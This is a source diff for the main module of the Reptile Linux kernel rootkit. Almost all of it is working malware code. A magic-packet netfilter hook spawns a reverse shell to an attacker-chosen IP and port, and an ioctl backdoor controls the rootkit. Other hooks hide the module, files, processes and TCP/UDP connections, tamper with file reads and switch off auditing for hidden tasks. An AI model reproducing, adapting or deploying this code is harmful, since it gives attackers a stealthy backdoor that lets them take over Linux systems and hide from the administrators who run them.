@@ -5,6 +5,8 @@
  *
  */
 
+#include <linux/audit.h>
+#include <linux/binfmts.h>
 #include <linux/cred.h>
 #include <linux/dirent.h>
 #include <linux/file.h>
@@ -30,19 +32,8 @@
 #include <linux/workqueue.h>
 #include <net/inet_sock.h>
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-#include <linux/proc_ns.h>
-#else
-#include <linux/proc_fs.h>
-#endif
-#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
-#include <linux/fdtable.h>
-#endif
-
-#include "engine/engine.c"
-#include "engine/engine.h"
-
 #include "config.h"
+#include "khook/engine.c"
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
 #define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
@@ -52,36 +43,25 @@
 
 #define bzero(b, len) (memset((b), '\0', (len)), (void)0)
 #define SSIZE_MAX 32767
-#define AUTH 0xdeadbeef
-#define HTUA 0xc0debabe
+#define FLAG 0x80000000
 #define RL_BUFSIZE 2048
 #define TOK_BUFSIZE 64
-#define TOK_DELIM                                                              \
-	({                                                                     \
-		unsigned int *p = __builtin_alloca(4);                         \
-		p[0] = 0x00000020;                                             \
-		(char *)p;                                                     \
+#define TOK_DELIM                                      \
+	({                                             \
+		unsigned int *p = __builtin_alloca(4); \
+		p[0] = 0x00000020;                     \
+		(char *)p;                             \
 	})
+
+/*  
+ *  All these definitions below is random and can be changed if you want
+ *  But make sure you will change that in sbin/util.h
+ */
 #define ID 12345
 #define SEQ 28782
 #define WIN 8192
-#define TMPSZ 150
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-#define VFS_READ                                                               \
-	({                                                                     \
-		unsigned int *p = (unsigned int *)__builtin_alloca(9);         \
-		p[0] = 0x5f736676;                                             \
-		p[1] = 0x64616572;                                             \
-		p[2] = 0x00;                                                   \
-		(char *)p;                                                     \
-	})
-
-asmlinkage ssize_t (*vfs_read_addr)(struct file *file, char __user *buf,
-				    size_t count, loff_t *pos);
-#endif
-
-int hidden = 0, hide_file_content = 0, control_flag = 0;
+int hidden = 1, hide_module = 0, file_tampering = 0, control_flag = 0;
 struct workqueue_struct *work_queue;
 static struct nf_hook_ops magic_packet_hook_options;
 static struct list_head *mod_list;
@@ -99,11 +79,9 @@ struct shell_task {
 	char *secret;
 };
 
-struct linux_dirent {
-	unsigned long d_ino;
-	unsigned long d_off;
-	unsigned short d_reclen;
-	char d_name[1];
+struct tgid_iter {
+	unsigned int tgid;
+	struct task_struct *task;
 };
 
 struct hidden_conn {
@@ -112,42 +90,11 @@ struct hidden_conn {
 };
 
 LIST_HEAD(hidden_tcp_conn);
-
-struct ksym {
-	char *name;
-	unsigned long addr;
-};
-
-int find_ksym(void *data, const char *name, struct module *module,
-	      unsigned long address)
-{
-	struct ksym *ksym = (struct ksym *)data;
-	char *target = ksym->name;
-
-	if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
-		ksym->addr = address;
-		return 1;
-	}
-
-	return 0;
-}
-
-unsigned long get_symbol(char *name)
-{
-	unsigned long symbol = 0;
-	struct ksym ksym;
-
-	ksym.name = name;
-	ksym.addr = 0;
-	kallsyms_on_each_symbol(&find_ksym, &ksym);
-	symbol = ksym.addr;
-
-	return symbol;
-}
+LIST_HEAD(hidden_udp_conn);
 
 void hide(void)
 {
-	if (hidden)
+	if (hide_module)
 		return;
 
 	while (!mutex_trylock(&module_mutex))
@@ -157,19 +104,55 @@ void hide(void)
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
 	mutex_unlock(&module_mutex);
-	hidden = 1;
+	hide_module = 1;
 }
 
 void show(void)
 {
-	if (!hidden)
+	if (!hide_module)
 		return;
 
 	while (!mutex_trylock(&module_mutex))
 		cpu_relax();
 	list_add(&THIS_MODULE->list, mod_list);
 	mutex_unlock(&module_mutex);
-	hidden = 0;
+	hide_module = 0;
+}
+
+int flag_tasks(pid_t pid, int set)
+{
+	int ret = 0;
+	struct pid *p;
+
+	rcu_read_lock();
+	p = find_get_pid(pid);
+	if (p) {
+		struct task_struct *task = get_pid_task(p, PIDTYPE_PID);
+		if (task) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
+			struct task_struct *t = NULL;
+
+			for_each_thread(task, t)
+			{
+				if (set)
+					t->flags |= FLAG;
+				else
+					t->flags &= ~FLAG;
+
+				ret++;
+			}
+#endif
+			if (set)
+				task->flags |= FLAG;
+			else
+				task->flags &= ~FLAG;
+
+			put_task_struct(task);
+		}
+		put_pid(p);
+	}
+	rcu_read_unlock();
+	return ret;
 }
 
 struct task_struct *find_task(pid_t pid)
@@ -197,20 +180,23 @@ int is_invisible(pid_t pid)
 
 	if (!pid)
 		return ret;
+
 	task = find_task(pid);
 	if (!task)
 		return ret;
-	if (task->flags & 0x10000000)
+
+	if (task->flags & FLAG)
 		ret = 1;
+
 	put_task_struct(task);
 	return ret;
 }
 
-void exec(char **argv)
+int exec(char **argv)
 {
 	char *path = PATH;
 	char *envp[] = {path, NULL};
-	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 void shell_execer(struct work_struct *work)
@@ -286,26 +272,6 @@ int shell_exec_queue(char *path, char *ip, char *port, char *secret)
 	}
 
 	return queue_work(work_queue, &task->work);
-}
-
-struct file *e_fget_light(unsigned int fd, int *fput_needed)
-{
-	struct file *file;
-	struct files_struct *files = current->files;
-
-	*fput_needed = 0;
-	if (likely((atomic_read(&files->count) == 1))) {
-		file = fcheck(fd);
-	} else {
-		spin_lock(&files->file_lock);
-		file = fcheck(fd);
-		if (file) {
-			get_file(file);
-			*fput_needed = 1;
-		}
-		spin_unlock(&files->file_lock);
-	}
-	return file;
 }
 
 int f_check(void *arg, ssize_t size)
@@ -388,8 +354,7 @@ char **parse(char *line)
 		if (position >= bufsize) {
 			bufsize += TOK_BUFSIZE;
 			tokens_backup = tokens;
-			tokens = krealloc(tokens, bufsize * sizeof(char *),
-					  GFP_KERNEL);
+			tokens = krealloc(tokens, bufsize * sizeof(char *), GFP_KERNEL);
 			if (!tokens) {
 				kfree(tokens_backup);
 				return NULL;
@@ -424,10 +389,10 @@ void _sub(char *arg, int key, int nbytes)
 }
 
 unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
-			       struct sk_buff *socket_buffer,
-			       const struct net_device *in,
-			       const struct net_device *out,
-			       int (*okfn)(struct sk_buff *))
+			    			   struct sk_buff *socket_buffer,
+			    			   const struct net_device *in,
+							   const struct net_device *out,
+							   int (*okfn)(struct sk_buff *))
 {
 	const struct iphdr *ip_header;
 	const struct icmphdr *icmp_header;
@@ -470,11 +435,9 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 		if (htons(tcp_header->source) != SRCPORT)
 			return NF_ACCEPT;
 
-		if (htons(tcp_header->seq) == SEQ &&
+		if (//htons(tcp_header->seq) == SEQ &&   /* uncoment this if you wanna use tcp_header->seq as filter */
 		    htons(tcp_header->window) == WIN) {
-
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_tcph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_tcph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -489,9 +452,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct tcphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct tcphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -510,8 +472,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -539,8 +500,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 		if (htons(icmp_header->un.echo.sequence) == SEQ &&
 		    htons(icmp_header->un.echo.id) == WIN) {
 
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_icmph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -555,9 +515,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct icmphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct icmphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -576,9 +535,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
-
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -606,8 +563,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 		if (htons(udp_header->len) <=
 		    (sizeof(struct udphdr) + strlen(TOKEN) + 25)) {
 
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_udph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_udph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -622,9 +578,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct udphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct udphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -643,9 +598,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
-
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -663,168 +616,115 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 	return NF_ACCEPT;
 }
 
-KHOOK(sys_getdents64);
-static int khook_sys_getdents64(unsigned int fd,
-				struct linux_dirent64 __user *dirent,
-				unsigned int count)
+KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_fillonedir(void *__buf, const char *name, int namlen,
+			    loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret;
-	unsigned short p = 0;
-	unsigned long off = 0;
-	struct linux_dirent64 *dir, *kdir, *prev = NULL;
-	struct inode *d_inode;
-	char *hide = HIDE;
-
-	KHOOK_GET(sys_getdents64);
-	ret = KHOOK_ORIGIN(sys_getdents64, fd, dirent, count);
-
-	if (!hidden)
-		goto final;
-
-	if (ret <= 0)
-		goto final;
-
-	kdir = kzalloc(ret, GFP_KERNEL);
-	if (kdir == NULL)
-		goto final;
-
-	if (copy_from_user(kdir, dirent, ret))
-		goto end;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
-		p = 1;
-
-	while (off < ret) {
-		dir = (void *)kdir + off;
-		if ((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) ||
-		    (p &&
-		     is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdir) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else {
-			prev = dir;
-		}
-		off += dir->d_reclen;
-	}
-	if (copy_to_user(dirent, kdir, ret))
-		goto end;
-
-end:
-	kfree(kdir);
-final:
-	KHOOK_PUT(sys_getdents64);
+	int ret = 0;
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
 
-KHOOK(sys_getdents);
-static int khook_sys_getdents(unsigned int fd,
-			      struct linux_dirent __user *dirent,
-			      unsigned int count)
+KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir(void *__buf, const char *name, int namlen,
+			 loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret;
-	unsigned short p = 0;
-	unsigned long off = 0;
-	struct linux_dirent *dir, *kdir, *prev = NULL;
-	struct inode *d_inode;
-	char *hide = HIDE;
-
-	KHOOK_GET(sys_getdents);
-	ret = KHOOK_ORIGIN(sys_getdents, fd, dirent, count);
-
-	if (!hidden)
-		goto final;
-
-	if (ret <= 0)
-		goto final;
-
-	kdir = kzalloc(ret, GFP_KERNEL);
-	if (kdir == NULL)
-		goto final;
-
-	if (copy_from_user(kdir, dirent, ret))
-		goto end;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
-		p = 1;
-
-	while (off < ret) {
-		dir = (void *)kdir + off;
-		if ((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) ||
-		    (p &&
-		     is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdir) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else {
-			prev = dir;
-		}
-		off += dir->d_reclen;
-	}
-	if (copy_to_user(dirent, kdir, ret))
-		goto end;
-
-end:
-	kfree(kdir);
-
-final:
-	KHOOK_PUT(sys_getdents);
+	int ret = 0;
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
 
-KHOOK(sys_read);
-static ssize_t khook_sys_read(unsigned int fd, char __user *buf, size_t count)
+KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir64(void *__buf, const char *name, int namlen,
+			   loff_t offset, u64 ino, unsigned int d_type)
 {
-	struct file *f;
-	int fput_needed;
-	ssize_t ret;
+	int ret = 0;
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
 
-	KHOOK_GET(sys_read);
+KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
+				   loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
 
-	if (hide_file_content) {
-		ret = -EBADF;
+KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir(void *__buf, const char *name, int namlen,
+				loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
 
-		f = e_fget_light(fd, &fput_needed);
-
-		if (f) {
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
-			ret = vfs_read(f, buf, count, &f->f_pos);
-#else
-			ret = vfs_read_addr(f, buf, count, &f->f_pos);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
+KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
+				  loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
 #endif
-			if (f_check(buf, ret) == 1)
-				ret = hide_content(buf, ret);
 
-			fput_light(f, fput_needed);
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
+KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
+struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
+#else
+KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
+struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
+#endif
+{
+	struct dentry *found = NULL;
+	if (!strstr(name->name, HIDE) || !hidden)
+		found = KHOOK_ORIGIN(__d_lookup, parent, name);
+	return found;
+}
+
+KHOOK_EXT(struct tgid_iter, next_tgid, struct pid_namespace *, struct tgid_iter);
+static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_iter iter)
+{
+	if (hidden) {
+		while ((iter = KHOOK_ORIGIN(next_tgid, ns, iter), iter.task) != NULL) {
+			if (!(iter.task->flags & FLAG))
+				break;
+
+			iter.tgid++;
 		}
 	} else {
-		ret = KHOOK_ORIGIN(sys_read, fd, buf, count);
+		iter = KHOOK_ORIGIN(next_tgid, ns, iter);
 	}
+	return iter;
+}
 
-	KHOOK_PUT(sys_read);
+KHOOK_EXT(ssize_t, vfs_read, struct file *, char __user *, size_t, loff_t *);
+static ssize_t khook_vfs_read(struct file *file, char __user *buf,
+			      size_t count, loff_t *pos)
+{
+	ssize_t ret;
+
+	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);
+
+	if (file_tampering) {
+		if (f_check(buf, ret) == 1)
+			ret = hide_content(buf, ret);
+	}
 
 	return ret;
 }
 
-KHOOK_EXT(int, inet_ioctl, struct socket *sock, unsigned int cmd,
-	  unsigned long arg);
+KHOOK_EXT(int, inet_ioctl, struct socket *, unsigned int, unsigned long);
 static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 			    unsigned long arg)
 {
@@ -832,10 +732,8 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 	unsigned int pid;
 	struct control args;
 	struct sockaddr_in addr;
-	struct task_struct *task;
 	struct hidden_conn *hc;
 
-	KHOOK_GET(inet_ioctl);
 	if (cmd == AUTH && arg == HTUA) {
 		if (control_flag) {
 			control_flag = 0;
@@ -852,27 +750,29 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 
 		switch (args.cmd) {
 		case 0:
-			if (hidden)
+			if (hide_module) {
 				show();
-			else
+				hidden = 0;
+			} else {
 				hide();
+				hidden = 1;
+			}
 			break;
 		case 1:
-			if (copy_from_user(&pid, args.argv,
-					   sizeof(unsigned int)))
+			if (copy_from_user(&pid, args.argv, sizeof(unsigned int)))
 				goto out;
 
-			if ((task = find_task(pid)) == NULL)
-				goto out;
+			if (is_invisible(pid))
+				flag_tasks(pid, 0);
+			else
+				flag_tasks(pid, 1);
 
-			task->flags ^= 0x10000000;
-			put_task_struct(task);
 			break;
 		case 2:
-			if (hide_file_content)
-				hide_file_content = 0;
+			if (file_tampering)
+				file_tampering = 0;
 			else
-				hide_file_content = 1;
+				file_tampering = 1;
 			break;
 		case 3:
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
@@ -891,8 +791,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 #endif
 			break;
 		case 4:
-			if (copy_from_user(&addr, args.argv,
-					   sizeof(struct sockaddr_in)))
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
 				goto out;
 
 			hc = kmalloc(sizeof(*hc), GFP_KERNEL);
@@ -905,11 +804,38 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 			list_add(&hc->list, &hidden_tcp_conn);
 			break;
 		case 5:
-			if (copy_from_user(&addr, args.argv,
-					   sizeof(struct sockaddr_in)))
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
 				goto out;
 
 			list_for_each_entry(hc, &hidden_tcp_conn, list)
+			{
+				if (addr.sin_port == hc->addr.sin_port &&
+				    addr.sin_addr.s_addr ==
+					hc->addr.sin_addr.s_addr) {
+					list_del(&hc->list);
+					kfree(hc);
+					break;
+				}
+			}
+			break;
+		case 6:
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
+				goto out;
+
+			hc = kmalloc(sizeof(*hc), GFP_KERNEL);
+
+			if (!hc)
+				goto out;
+
+			hc->addr = addr;
+
+			list_add(&hc->list, &hidden_udp_conn);
+			break;
+		case 7:
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
+				goto out;
+
+			list_for_each_entry(hc, &hidden_udp_conn, list)
 			{
 				if (addr.sin_port == hc->addr.sin_port &&
 				    addr.sin_addr.s_addr ==
@@ -930,11 +856,10 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 origin:
 	ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
 out:
-	KHOOK_PUT(inet_ioctl);
 	return ret;
 }
 
-KHOOK_EXT(int, tcp4_seq_show, struct seq_file *seq, void *v);
+KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
 static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
 	int ret;
@@ -944,31 +869,127 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 	unsigned short dport;
 	unsigned int daddr;
 
-	KHOOK_GET(tcp4_seq_show);
-
-	seq_setwidth(seq, TMPSZ - 1);
 	if (v == SEQ_START_TOKEN) {
-		ret = 0;
-		goto out;
+		goto origin;
 	}
 
 	inet = (struct inet_sock *)sk;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
 	dport = inet->inet_dport;
 	daddr = inet->inet_daddr;
+#else
+	dport = inet->dport;
+	daddr = inet->daddr;
+#endif
 
 	list_for_each_entry(hc, &hidden_tcp_conn, list)
 	{
-		if (hc->addr.sin_port == dport &&
+		if ( //hc->addr.sin_port == dport &&
 		    hc->addr.sin_addr.s_addr == daddr) {
 			ret = 0;
 			goto out;
 		}
 	}
-
+origin:
 	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
 out:
-	KHOOK_PUT(tcp4_seq_show);
 	return ret;
+}
+
+KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
+static int khook_udp4_seq_show(struct seq_file *seq, void *v)
+{
+	int ret;
+	struct sock *sk = v;
+	struct inet_sock *inet;
+	struct hidden_conn *hc;
+	unsigned short dport;
+	unsigned int daddr;
+
+	if (v == SEQ_START_TOKEN) {
+		goto origin;
+	}
+
+	inet = (struct inet_sock *)sk;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
+	dport = inet->inet_dport;
+	daddr = inet->inet_daddr;
+#else
+	dport = inet->dport;
+	daddr = inet->daddr;
+#endif
+
+	list_for_each_entry(hc, &hidden_udp_conn, list)
+	{
+		if ( //hc->addr.sin_port == dport &&
+		    hc->addr.sin_addr.s_addr == daddr) {
+			ret = 0;
+			goto out;
+		}
+	}
+origin:
+	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
+out:
+	return ret;
+}
+
+KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
+static int khook_load_elf_binary(struct linux_binprm *bprm)
+{
+	int ret = 0;
+
+	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
+	if (!ret && !strcmp(bprm->filename, SHELL))
+		flag_tasks(current->pid, 1);
+
+	return ret;
+}
+
+KHOOK(copy_creds);
+static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
+{
+	int ret = 0;
+
+	ret = KHOOK_ORIGIN(copy_creds, p, clone_flags);
+	if (!ret && current->flags & FLAG)
+		p->flags |= FLAG;
+
+	return ret;
+}
+
+KHOOK(exit_creds);
+static void khook_exit_creds(struct task_struct *p)
+{
+	KHOOK_ORIGIN(exit_creds, p);
+	if (p->flags & FLAG)
+		p->flags &= ~FLAG;
+}
+
+KHOOK(audit_alloc);
+static int khook_audit_alloc(struct task_struct *t)
+{
+	int err = 0;
+
+	if (t->flags & FLAG) {
+		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
+	} else {
+		err = KHOOK_ORIGIN(audit_alloc, t);
+	}
+	return err;
+}
+
+KHOOK(find_task_by_vpid);
+struct task_struct *khook_find_task_by_vpid(pid_t vnr)
+{
+	struct task_struct *tsk = NULL;
+
+	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
+	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
+		tsk = NULL;
+
+	return tsk;
 }
 
 static int __init reptile_init(void)
@@ -976,12 +997,12 @@ static int __init reptile_init(void)
 	int ret;
 	char *argv[] = {START, NULL, NULL};
 
-	hide();
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-	vfs_read_addr = (void *)get_symbol(VFS_READ);
-#endif
 	work_queue = create_workqueue(WORKQUEUE);
+
+	ret = khook_init();
+
+	if (ret != 0)
+		goto out;
 
 	magic_packet_hook_options.hook = (void *)magic_packet_hook;
 	magic_packet_hook_options.hooknum = 0;
@@ -993,9 +1014,10 @@ static int __init reptile_init(void)
 #else
 	nf_register_hook(&magic_packet_hook_options);
 #endif
-	ret = khook_init();
+	
 	exec(argv);
-
+	hide();
+out:
 	return ret;
 }
 
